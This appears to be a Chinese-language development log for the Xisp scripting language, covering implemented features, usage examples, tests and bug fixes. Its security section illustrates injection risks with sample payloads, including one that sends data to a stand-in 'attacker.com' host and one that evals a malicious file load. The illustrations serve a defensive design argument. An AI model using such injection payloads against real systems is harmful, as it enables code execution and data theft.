# Xisp 文档示例中不支持的功能清单

**生成时间**: 2026-01-27
**最后更新**: 2026-01-27
**测试状态**: 已验证

---

## ✅ 已实现的功能（10个）

### 1. 宏/函数的可变参数

**状态**: ✅ 已实现（2026-01-27）

**优先级**: 🔴 高

**已实现**:
- ✅ Common Lisp 风格：`(x y . rest)`
- ✅ Scheme 风格：`(x y &rest rest)`
- ✅ 纯可变参数：`(. all)` 或 `(&rest all)`
- ✅ 空可变参数：`(x . rest)` 当只传入 x 时，rest 为 nil

**实现位置**:
- 解析器：`src/parser/parser.cj` - `parseRestParameter`
- 参数提取：`src/core/eval_helpers.cj` - `extractSymbols`
- 参数绑定：`src/core/eval_higher_order.cj` - `applyProcedure`

**单元测试**: `src/modern_test.cj`
- `testRestParameters` - 测试可变参数
- `testOnlyRestParameter` - 测试纯可变参数

**集成测试**: `lisp-tests/rest_params_test.lisp`

**使用示例**:
```lisp
; Common Lisp 风格
(define test-lambda
  (lambda (x y . rest)
    (list 'x=x x 'y=y 'rest=rest rest)))
(test-lambda 1 2 3 4 5)
; => (x=x 1 y=y 2 rest=rest (3 4 5))

; Scheme 风格
(define test-scheme
  (lambda (x y &rest rest)
    (list x y rest)))
(test-scheme 1 2 3 4)
; => (1 2 (3 4))

; 纯可变参数
(define test-all
  (lambda (. all)
    all))
(test-all 'a 'b 'c)
; => (a b c)

; 空可变参数
(test-lambda 1)
; => (x=x 1 y=y nil rest=rest nil)
```

---

### 2. ,@ (comma-at) 拼接

**状态**: ✅ 已实现（2026-01-27）

**优先级**: 🔴 高

**已实现**:
- ✅ 中间拼接：`` `(x y z ,@lst) ``
- ✅ 开头拼接：`` `(,@lst) ``
- ✅ 多个拼接：`` `(,@lst1 ,@lst2) ``
- ✅ 混合拼接：`` `(1 2 ,@lst 4 5) ``

**实现位置**:
- 核心逻辑：`src/core/eval_special_forms.cj` - `expandBackquote`

**单元测试**: `src/modern_test.cj` - `testCommaAtSplice`

**集成测试**: `lisp-tests/rest_params_test.lisp`

**使用示例**:
```lisp
(define lst1 '(a b c))
(define lst2 '(1 2 3))

; 中间拼接
`(x y z ,@lst1)
; => (x y z a b c)

; 开头拼接
`(,@lst2)
; => (1 2 3)

; 多个拼接
`(,@lst1 ,@lst2)
; => (a b c 1 2 3)

; 混合拼接
`(1 2 ,@lst1 4 5)
; => (1 2 a b c 4 5)
```

---

### 3. eval 特殊形式

**状态**: ✅ 已实现（2026-01-27）

**优先级**: 🔴 高

**已实现**:
- ✅ eval 整数
- ✅ eval 符号
- ✅ eval quoted list
- ✅ eval 动态构造的表达式
- ✅ eval 嵌套调用
- ✅ eval 字符串、nil 等基本类型

**实现位置**: `src/core/eval_higher_order.cj` - `evalEval`

**单元测试**: `src/modern_test.cj` - `testEval`

**使用示例**:
```lisp
; eval 整数
(eval 42)
; => 42

; eval 符号
(define x 100)
(eval (quote x))
; => 100

; eval quoted list - 动态执行 lambda
(eval (quote ((lambda (x y) (+ x y)) 10 20)))
; => 30

; eval 动态构造的表达式
(define code (quote (+ 1 2 3)))
(eval code)
; => 6

; eval 嵌套调用
(eval (list (quote +) 5 10))
; => 15
```

---

### 4. 符号/关键字比较

**状态**: ✅ 已实现（2026-01-27）

**优先级**: 🔴 高

**已实现**: `eq?` - 相等性比较（支持符号、字符串、整数、布尔值、nil）

**实现位置**: `src/core/builtin_logic.cj`

**测试文件**: `lisp-tests/equality_test.lisp`

---

### 5. 字符串比较函数

**状态**: ✅ 已实现（2026-01-27）

**优先级**: 🔴 高

**已实现**:
- `string=?` - 字符串相等比较
- `string<` - 字符串小于比较
- `string>` - 字符串大于比较

**实现位置**: `src/core/builtin_print.cj`

**测试文件**: `lisp-tests/equality_test.lisp`

---

### 6. shebang 支持

**状态**: ✅ 已实现（2026-01-27）

**优先级**: 🟡 中

**已实现**:
- ✅ Lexer 自动跳过 `#!` 开头的行
- ✅ 支持 .lisp 脚本作为可执行文件
- ✅ 跳过开头的空白字符后检测 shebang
- ✅ 正确处理非 shebang 的情况

**实现位置**: `src/parser/lexer.cj` - `skipShebang()`

**单元测试**: `src/parser/lexer_test.cj` - 测试 24-27（4个测试用例）

**测试脚本**: `lisp-tests/test_shebang.lisp`

**使用示例**:
```lisp
#!/usr/bin/env xisp-cli
;; 可执行的 Lisp 脚本
(println "Hello from shebang!")
(println "This script can be executed directly")

; 运行方式：
; 1. 添加执行权限：chmod +x script.lisp
; 2. 直接运行：./script.lisp
; 3. 或使用 xisp-cli：./target/release/bin/ystyle::xisp.cli script.lisp
```

---

### 7. HashMap 解构

**状态**: ✅ 已实现（2026-01-27）

**优先级**: 🟡 中

**已实现**:
- ✅ 基本 HashMap 解构：`(let [{:key1 var1 :key2 var2} hashmap-value] ...)`
- ✅ 部分键解构：只解构需要的键
- ✅ 嵌套解构：向量解构 + HashMap 解构
- ✅ 优化的代码结构：减少 match 嵌套层级

**实现位置**:
- 解析检测：`src/core/eval_helpers.cj` - `isHashMapDestructurePattern()`
- 绑定提取：`src/core/eval_helpers.cj` - `extractHashMapBindings()`
- 解构处理：`src/core/eval_helpers.cj` - `processHashMapDestructure()`
- let 集成：`src/core/eval_helpers.cj` - `processBindingsNew()`

**测试文件**: `lisp-tests/hashmap_destruct_test.lisp`

**使用示例**:
```lisp
; 基本 HashMap 解构
(define config {:host "localhost" :port 8080})
(let [{:host h :port p} config]
  (println h)  ; => "localhost"
  (println p))  ; => 8080

; 部分键解构
(define data {:name "Alice" :age 30 :city "Beijing"})
(let [{:name n :age a} data]
  (println n)  ; => "Alice"
  (println a))  ; => 30

; 嵌套解构（向量 + HashMap）
(define users [{:name "Bob" :email "bob@example.com"}
              {:name "Carol" :email "carol@example.com"}])
(let [[user1 user2] users]
  (let [{:name n1 :email e1} user1]
    (let [{:name n2 :email e2} user2]
      (println n1)  ; => "Bob"
      (println e1)  ; => "bob@example.com"
      (println n2)  ; => "Carol"
      (println e2))))  ; => "carol@example.com"
```

**实现细节**:
- HashMap 字面量 `{:key1 var1 :key2 var2}` 被解析为 `(hashmap (quote :key1) var1 (quote :key2) var2)`
- 在 let 中，通过检测第一个元素是否为 `hashmap` 符号来识别解构模式
- 从模式中提取 `(quote :key)` 和 `varName` 对，去掉 `:key` 的冒号前缀
- 使用提取的键从实际 HashMap 值中获取并绑定变量

---

### 8. match HashMap 模式匹配

**状态**: ✅ 已实现（2026-01-27）

**优先级**: 🟡 中

**已实现**:
- ✅ 基本 HashMap 匹配：`(match {:name "Alice" :age 30} {:name n :age a} (list n a))`
- ✅ 部分键匹配：`(match {:name "Bob" :age 25} {:name n} n)`
- ✅ 多分支匹配：匹配失败时跳到下一个分支
- ✅ 通配符 `_`：匹配任意 HashMap
- ✅ 变量绑定：`{:key varName}` 绑定任何值
- ✅ 常量匹配：`{:key "value"}` 需要精确匹配

**实现位置**:
- 模式路由：`src/core/eval_pattern_match.cj` - `evalMatch()` - HashMap 模式检测（lines 100-107）
- 模式匹配：`src/core/eval_pattern_match.cj` - `matchHashMapPattern()` - HashMap 模式匹配（lines 526-598）
- 绑定提取：`src/core/eval_helpers.cj` - `extractHashMapBindings()` - 从模式中提取键值对

**单元测试**: `src/modern_test.cj` - `testMatchHashMapPattern` (7个测试用例)

**测试文件**: `lisp-tests/match_hashmap_test.lisp`

**使用示例**:
```lisp
; 基本 HashMap 匹配
(match {:name "Alice" :age 30}
  {:name n :age a} (list n a)
  _ "not matched")
; => ("Alice" 30)

; 部分键匹配
(match {:name "Bob" :age 25}
  {:name n} n
  _ "not matched")
; => "Bob"

; 多分支匹配
(match {:name "Charlie"}
  {:name n :age a} "should not match"
  {:name n} (list "matched" n))
; => ("matched" "Charlie")

; 通配符
(match {:x 1 :y 2}
  _ "wildcard")
; => "wildcard"

; 常量匹配（精确匹配键值）
(match {:type "admin"}
  {:type "admin"} "is admin"
  {:type t} (list "is" t))
; => "is admin"
```

**实现细节**:
- HashMap 字面量 `{:key1 var1 :key2 var2}` 被解析为 `(hashmap (quote :key1) var1 (quote :key2) var2)`
- 在 `evalMatch()` 中检测到 `hashmap` 符号时，设置 `areAllPatterns = true`
- 这使得整个 clause 被当作模式，结果表达式在下一个元素
- `matchHashMapPattern()` 从 HashMap 值中提取键，并与模式中的键值对匹配
- 支持变量绑定（`{:key varName}` 绑定任何值）和常量匹配（`{:key "value"}` 需要精确匹配）

---

## ✅ 已实现的功能（10个）

### 9. match 守卫条件多行格式

**状态**: ✅ 已实现（2026-01-27）

**优先级**: 🟡 中

**已实现**:
- ✅ 单行守卫格式：`(match value (pattern when guard) result1 pattern2 result2)`
- ✅ 多行守卫格式：守卫条件和结果表达式在不同行
- ✅ 守卫失败自动跳过下一个分支
- ✅ 支持列表模式、HashMap 模式配合守卫条件

**实现位置**:
- 核心逻辑：`src/core/eval_pattern_match.cj` - `evalMatch()`
- 守卫检测：添加 `isGuardClause` 判断 `(pattern when guard)` 格式
- 跳过逻辑：守卫失败时正确跳过下一个子句（结果表达式）

**单元测试**: `src/modern_test.cj`
- `testMatchGuardClauses` - 守卫条件综合测试（12个测试用例）
- `testParseMultilineGuard` - 解析格式测试（展示正确/错误语法）

**使用示例**:
```lisp
;; 多行格式（推荐）
(match 15
  (x when (> x 10)) "large"
  (x when (< x 5)) "small"
  _ "medium")
; => "large"

;; 单行格式（同样支持）
(match 15 (x when (> x 10)) "large" (x when (< x 5)) "small" _ "medium")
; => "large"

;; 列表模式 + 守卫
(match '(1 2 3)
  ((x y z) when (= (+ x y) z)) "sum matches"
  _ "not matched")
; => "sum matches"

;; HashMap 模式 + 守卫
(match {:name "Alice" :age 30}
  ({:name n :age a} when (> a 25)) (list "adult" n)
  ({:name n} (list "child" n)))
; => ("adult" "Alice")

;; 守卫失败，自动跳到下一个分支
(match 3
  (x when (> x 10)) "large"
  (x when (< x 5)) "small"
  _ "medium")
; => "small"
```

**语法注意事项**:
```lisp
;; ✅ 正确：守卫子句和结果在同一个 match 表达式内
(match 15 (x when (> x 10)) "large" (x when (< x 5)) "small" _ "medium")

;; ❌ 错误：多写了括号，导致 _ "medium" 在 match 表达式外面
(match 15 (x when (> x 10)) (str "large: " x) (x when (< x 10)) (str "small: " x)) _ "medium")
; 注意 (str "small: " x)) 后面有两个 ))，这会提前结束 match 表达式
; 结果被解析成 4 个独立的表达式
```

**实现细节**:
1. **格式识别**：检测 `(pattern when guard)` 格式，其中 `when` 后面只有一个元素（守卫表达式）
2. **求值逻辑**：
   - 匹配 `pattern`
   - 在匹配环境中求值 `guard`
   - 如果守卫成功，从下一个子句获取结果表达式
   - 如果守卫失败，跳过下一个子句（结果表达式），继续匹配
3. **兼容性**：与单行格式 `(pattern when guard result...)` 完全兼容

**测试覆盖**: 212 个单元测试全部通过（新增 12 个守卫条件测试）

---

## 🔒 设计限制（出于安全或设计考虑不支持）

### 字符串插值中的函数调用

**状态**: ⚫ 设计限制 - 不支持（出于安全考虑）

**原因**:
- Xisp 是嵌入式脚本语言，字符串可能来自不可信来源（前端用户输入、配置文件、外部API等）
- 支持函数调用会导致代码注入风险
- 当前设计只支持安全的、无副作用的表达式

**只支持**:
- 简单变量: `#"Name: #{name}"` ✅
- 简单表达式: `#"Sum: #{+ x y}"` ✅
- 字符串拼接: `#"Path: #{base}/file.txt"` ✅

**明确不支持**:
- 函数调用: `#{(func arg)}` ❌
- 特殊形式: `#{(if condition a b)}` ❌
- 任意代码执行: `#{(eval code)}` ❌

**安全风险示例**（如果支持）:
```lisp
;; 风险 1: 用户输入注入
(let [username "#{(delete-all-users)}"]
  (println #"Welcome, #{username}!"))
;; 如果支持函数调用，就会执行危险操作

;; 风险 2: 配置文件注入
;; 配置文件内容: "Welcome #{(eval '(load \"malicious.lisp\"))}"
(println (read-config-string))
;; 会执行恶意代码

;; 风险 3: 日志注入
(println #"User input: #{user-input}")
;; 如果 user-input = "#{(send-data 'http://attacker.com' data)}"
;; 会泄露数据
```

**替代方案**:
```lisp
;; 方案 1: 使用 str 函数拼接
(str "Result: " (hget m :name))

;; 方案 2: 使用 println 多参数
(println "Result:" (hget m :name))

;; 方案 3: 先求值再插值
(let [result (hget m :name)]
  (println #"Value: #{result}"))
```

**与其他语言对比**:

| 语言 | 字符串插值 | 编译时vs运行时 | 安全性 |
|------|-----------|---------------|--------|
| **Python** | `f"{func(arg)}"` | 编译时确定 | 相对安全 |
| **JavaScript** | `` `${func(arg)}` `` | 编译时确定 | 相对安全 |
| **Xisp** | `#{var}` `#{+ x y}` | 运行时解析 | **需要限制** |

**关键区别**：
- Python/JS 的字符串插值是**编译时语法**，代码在源码中已经确定
- Xisp 的字符串插值是**运行时解析**的，字符串可能来自外部输入
- 因此 Xisp 必须限制字符串插值的功能，确保安全

**设计优势**:
1. **安全性**: 防止代码注入
2. **简洁性**: 保持语言简单
3. **可预测性**: 字符串插值的行为清晰
4. **性能**: 不需要在插值中处理复杂的函数调用

---

## ✅ 确认支持的功能

1. ✅ 简单向量解构: `let [[x y] [1 2]]`
2. ✅ 向量解构 with &: `let [[x y & rest] [1 2 3 4 5]]`
3. ✅ 嵌套向量解构: `let [[[a b] c] [[1 2] 3]]`
4. ✅ HashMap 解构: `let [{:key1 var1 :key2 var2} hashmap-value]`
5. ✅ match 符号匹配: `match :admin :admin "Administrator"`
6. ✅ match 多行常量匹配、列表解构、向量匹配
7. ✅ **match 守卫条件多行格式** - 2026-01-27 完成

---

## 实现优先级建议

### ✅ 已完成功能（9个）

1. ✅ **符号/关键字比较** (`eq?`) - 2026-01-27 完成
2. ✅ **字符串比较函数** (`string=?`, `string<`, `string>`) - 2026-01-27 完成
3. ✅ **宏/函数的可变参数** - 2026-01-27 完成
4. ✅ **,@ (comma-at) 拼接** - 2026-01-27 完成
5. ✅ **eval 特殊形式** - 2026-01-27 完成
6. ✅ **宏的纯可变参数 bug 修复** - 2026-01-27 完成
7. ✅ **HashMap 解构** - 2026-01-27 完成
8. ✅ **match HashMap 模式匹配** - 2026-01-27 完成
9. ✅ **match 守卫条件多行格式** - 2026-01-27 完成

### 🟡 中优先级（增强语法特性）

**当前没有待实现的中优先级功能**

### ⚫ 设计限制（不实现）

10. **字符串插值中的函数调用**
   - 原因：**安全考虑**，防止代码注入
   - 状态：设计限制，永久不支持
   - 详见：[设计限制](#-设计限制出于安全或设计考虑不支持) 章节

---

## 测试命令

```bash
# 运行完整测试
cjpm test

# 运行特定测试
cjpm test --show-all-output --filter 'ModernTest.testRestParameters'
cjpm test --show-all-output --filter 'ModernTest.testCommaAtSplice'
cjpm test --show-all-output --filter 'ModernTest.testEval'
cjpm test --show-all-output --filter 'ModernTest.testMacroRestParameters'

# 运行 Lisp 集成测试
./target/release/bin/ystyle::xisp.cli lisp-tests/rest_params_test.lisp
./target/release/bin/ystyle::xisp.cli lisp-tests/equality_test.lisp
./target/release/bin/ystyle::xisp.cli lisp-tests/macro_rest_test.lisp
```

---

## 下一步行动

1. ✅ 文档已修正为使用支持的语法
2. ✅ 已实现：高优先级功能（eq?、string=?、string<、string>、可变参数、,@ 拼接、eval）
3. ✅ **宏的纯可变参数 bug 已修复**
4. ✅ 所有功能都有完整的单元测试和集成测试
5. ✅ 字符串插值函数调用已标记为设计限制（安全考虑）
6. 📝 考虑：中优先级功能的实现计划

**最后更新**: 2026-01-27
**测试覆盖率**: 210 个单元测试全部通过（新增 match HashMap 测试）
**不支持功能**: 1 个（中优先级）
**设计限制**: 1 个（字符串插值函数调用 - 永久不支持）

---

## 修复历史

### 2026-01-27: HashMap 解构实现 ✅

**功能描述**: 实现 let 表达式中的 HashMap 解构功能

**实现内容**:
- **检测机制**: 修改 `isHashMapDestructurePattern()` 检测 `(hashmap (quote :key) var ...)` 格式
- **绑定提取**: 修改 `extractHashMapBindings()` 从 `(hashmap (quote :key1) var1 ...)` 中提取键值对
- **解构处理**: 实现 `processHashMapDestructure()` 从 HashMap 值中获取并绑定变量
- **代码优化**: 使用 match 模式嵌套减少代码嵌套层级（从 11 层降到 6-8 层）
- **单元测试**: 添加 8 个测试用例覆盖基本解构、部分键解构、嵌套解构等场景

**实现位置**:
- `src/core/eval_helpers.cj` - `isHashMapDestructurePattern()`, `extractHashMapBindings()`, `processHashMapDestructure()`
- `src/core/eval_helpers.cj` - `processBindingsNew()` - HashMap 解构集成
- `src/modern_test.cj` - `testHashMapDestructuring()` - 单元测试

**测试文件**:
- 单元测试: `src/modern_test.cj` - `testHashMapDestructuring` (8个测试用例)
- 集成测试: `lisp-tests/hashmap_destruct_test.lisp`
- 调试测试: `lisp-tests/debug_hashmap.lisp`

**测试结果**: 209 个单元测试全部通过 ✅

**使用示例**:
```lisp
; 基本 HashMap 解构
(define config {:host "localhost" :port 8080})
(let [{:host h :port p} config]
  (println h)  ; => "localhost"
  (println p))  ; => 8080

; 部分键解构
(let [{:name n :age a} {:name "Alice" :age 30 :city "Beijing"}]
  (list n a))  ; => ("Alice" 30)

; 嵌套 HashMap 解构
(let [{:name n1} {:name "Bob"}]
  (let [{:name n2} {:name "Carol"}]
    (list n1 n2)))  ; => ("Bob" "Carol")
```

**技术细节**:
- HashMap 字面量 `{:key var}` 被解析为 `(hashmap (quote :key) var)`
- 通过检测第一个元素是否为 `hashmap` 符号来识别解构模式
- 从 `(quote :key)` 中提取键，去掉冒号前缀用于 HashMap 查找
- 如果键不存在，绑定变量为 nil（静默失败）



---

### 2026-01-27: match HashMap 模式匹配实现 ✅

**功能描述**: 实现 match 表达式中的 HashMap 模式匹配功能

**实现内容**:
- **模式路由**: 修改 `evalMatch()` 检测 HashMap 模式并正确路由到 `matchHashMapPattern()`
- **模式匹配**: 实现 `matchHashMapPattern()` 支持变量绑定和常量匹配
- **修复关键bug**: 将 HashMap 模式的 `areAllPatterns` 从 `false` 改为 `true`，确保整个 clause 被当作模式
- **单元测试**: 添加 7 个测试用例覆盖基本匹配、部分键匹配、多分支匹配、通配符等场景

**实现位置**:
- `src/core/eval_pattern_match.cj` - `evalMatch()` - HashMap 模式路由（lines 100-107）
- `src/core/eval_pattern_match.cj` - `matchPattern()` - HashMap 模式检测（lines 369-381）
- `src/core/eval_pattern_match.cj` - `matchHashMapPattern()` - HashMap 模式匹配（lines 526-598）
- `src/core/eval_helpers.cj` - `extractHashMapBindings()` - 返回类型改为 `ArrayList<(String, LispValue)>` 以支持常量

**测试文件**:
- 单元测试: `src/modern_test.cj` - `testMatchHashMapPattern` (7个测试用例)
- 集成测试: `lisp-tests/match_hashmap_test.lisp`

**测试结果**: 210 个单元测试全部通过 ✅

**使用示例**:
```lisp
; 基本 HashMap 匹配
(match {:name "Alice" :age 30}
  {:name n :age a} (list n a)
  _ "not matched")
; => ("Alice" 30)

; 部分键匹配
(match {:name "Bob" :age 25}
  {:name n} n)
; => "Bob"

; 多分支匹配
(match {:name "Charlie"}
  {:name n :age a} "should not match"
  {:name n} (list "matched" n))
; => ("matched" "Charlie")

; 变量绑定 vs 常量匹配
(match {:type "user" :name "Dave"}
  {:type t :name n} (list t n)
  {:type "admin"} "admin"
  _ "unknown")
; => ("user" "Dave")
```

**技术细节**:
- HashMap 字面量 `{:key1 var1 :key2 var2}` 被解析为 `(hashmap (quote :key1) var1 (quote :key2) var2)`
- 在 `evalMatch()` 中检测到 `hashmap` 符号时，设置 `areAllPatterns = true`
- 这使得整个 clause 被当作模式（`needNextResult = true`），结果表达式在下一个元素
- `matchHashMapPattern()` 从 HashMap 值中提取键，并与模式中的键值对匹配
- 支持两种模式：
  - `{:key varName}` - 变量绑定，匹配任何值
  - `{:key "value"}` - 常量匹配，需要精确匹配
- 如果模式中的键在 HashMap 中不存在，匹配失败（返回 None）

**关键修复**:
- 问题：HashMap 模式被错误地当作单元素模式处理
- 原因：`areAllPatterns` 被设为 `false`，导致 `pattern = clauseCons.car`（即 `hashmap` 符号）
- 修复：将 `areAllPatterns` 改为 `true`，使得 `pattern = clause`（整个 `(hashmap ...)` 列表）




---

## 修复历史

### 2026-01-27: 宏的纯可变参数 Bug 修复 ✅

**问题描述**: 宏定义中的纯可变参数 `(. args)` 只能绑定第一个参数

**根本原因**:
1. 解析器问题：`src/parser/parser.cj:93` 的 `parseAtom()` 遇到 `Token.Dot` 时返回 `Nil`
2. 求值器问题：`src/core/eval_core.cj:169-172` 的 `evalFunctionCall()` 没有处理宏

**修复方案**:
1. 修改 `parseAtom()` 添加 `case Token.Dot => Symbol(".")`，正确解析点号
2. 修改 `evalFunctionCall()` 添加 `case Macro(_, _, _)` 分支，展开并求值宏

**影响文件**:
- `src/parser/parser.cj` - 解析器修复
- `src/core/eval_core.cj` - 求值器修复
- `src/modern_test.cj` - 添加 `testMacroRestParameters` 测试（5个用例）

**测试结果**: 所有 208 个单元测试通过 ✅


---

### 2026-01-27: shebang 支持实现 ✅

**功能描述**: 支持 .lisp 脚本文件作为可执行文件

**实现内容**:
- Lexer 新增 `skipShebang()` 方法
- 自动跳过 `#!` 开头的行
- 支持跳过开头的空白字符后检测 shebang
- 正确处理非 shebang 的情况（恢复位置）

**实现位置**: `src/parser/lexer.cj` - `skipShebang()`

**单元测试**: `src/parser/lexer_test.cj` - 测试 24-27（4个测试用例）

**测试脚本**: `lisp-tests/test_shebang.lisp`

**使用示例**:
```lisp
#!/usr/bin/env xisp-cli
;; 可执行的 Lisp 脚本
(println "Hello from shebang!")
(println "This script can be executed directly")

; 运行方式：
; 1. 添加执行权限：chmod +x script.lisp
; 2. 直接运行：./script.lisp
; 3. 或使用 xisp-cli：./target/release/bin/ystyle::xisp.cli script.lisp
```

**测试结果**: 所有 208 个单元测试通过 ✅
